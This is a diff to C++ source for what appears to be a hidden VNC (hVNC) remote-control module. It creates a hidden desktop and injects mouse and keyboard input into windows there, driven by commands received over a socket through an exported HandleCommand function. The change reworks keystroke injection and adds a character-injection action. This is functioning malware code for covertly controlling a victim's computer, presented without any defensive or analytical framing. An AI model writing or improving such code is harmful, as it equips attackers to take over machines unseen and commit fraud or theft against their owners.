@@ -148,7 +148,6 @@ static HWND  g_hCurrentFocus = NULL;
 static HWND  g_mouseDownTarget[3] = { NULL, NULL, NULL };
 static atomic_int g_staticFrameCount(0);
 static atomic_bool g_forceFullFrame(false);
-static BYTE g_keyState[256];
 
 // -----------------------------------------------------------------------
 
@@ -922,8 +921,6 @@ static void input_loop() {
     ensure_desktop();
     if (!g_hHiddenDesktop) { g_inputRunning = false; return; }
     if (!SetThreadDesktop(g_hHiddenDesktop)) { g_inputRunning = false; return; }
-    memset(g_keyState, 0, 256);
-    GetKeyboardState(g_keyState);
 
     while (g_inputRunning) {
         InputTask task;
@@ -939,48 +936,18 @@ static void input_loop() {
         const json&   cmd    = task.cmd;
 
         // ---- Klavye ----
-        if (action == "hvnc_keydown" || action == "hvnc_keyup") {
+        if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
             HWND hTarget = target_window_from_screen_point(g_lastMousePos);
             if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
             if (!hTarget || !IsWindow(hTarget)) continue;
 
-            DWORD targetThreadId = GetWindowThreadProcessId(hTarget, NULL);
-            DWORD currentThreadId = GetCurrentThreadId();
-
             if (action == "hvnc_keydown") {
-                bool isToggle = (vk == VK_CAPITAL || vk == VK_NUMLOCK || vk == VK_SCROLL);
-
-                if (isToggle) {
-                    // Only toggle if the key was not already "down" (prevent auto-repeat toggling)
-                    if (!(g_keyState[vk] & 0x80)) {
-                        g_keyState[vk] ^= 0x01; // Toggle bit 0
-                        g_keyState[vk] |= 0x80; // Mark as down
-
-                        // keybd_event updates the global keyboard state for the desktop
-                        keybd_event((BYTE)vk, 0, 0, 0);
-                        keybd_event((BYTE)vk, 0, KEYEVENTF_KEYUP, 0);
-                    }
-                } else {
-                    g_keyState[vk] |= 0x80;
-                }
-
-                AttachThreadInput(currentThreadId, targetThreadId, TRUE);
-                SetKeyboardState(g_keyState);
-                if (!isToggle) {
-                    PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
-                }
-                AttachThreadInput(currentThreadId, targetThreadId, FALSE);
-
+                PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
             } else if (action == "hvnc_keyup") {
-                g_keyState[vk] &= ~0x80;
-
-                AttachThreadInput(currentThreadId, targetThreadId, TRUE);
-                SetKeyboardState(g_keyState);
-                if (vk != VK_CAPITAL && vk != VK_NUMLOCK && vk != VK_SCROLL) {
-                    PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
-                }
-                AttachThreadInput(currentThreadId, targetThreadId, FALSE);
+                PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
+            } else if (action == "hvnc_char") {
+                PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
             }
             g_forceFullFrame = true;
             continue;
@@ -1265,6 +1232,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             }
         } else if (action.find("hvnc_mouse") != string::npos ||
                    action.find("hvnc_key")   != string::npos ||
+                   action == "hvnc_char" ||
                    action == "hvnc_doubleclick") {
             lock_guard<mutex> lock(g_inputMutex);
             g_inputQueue.push({action, cmd});
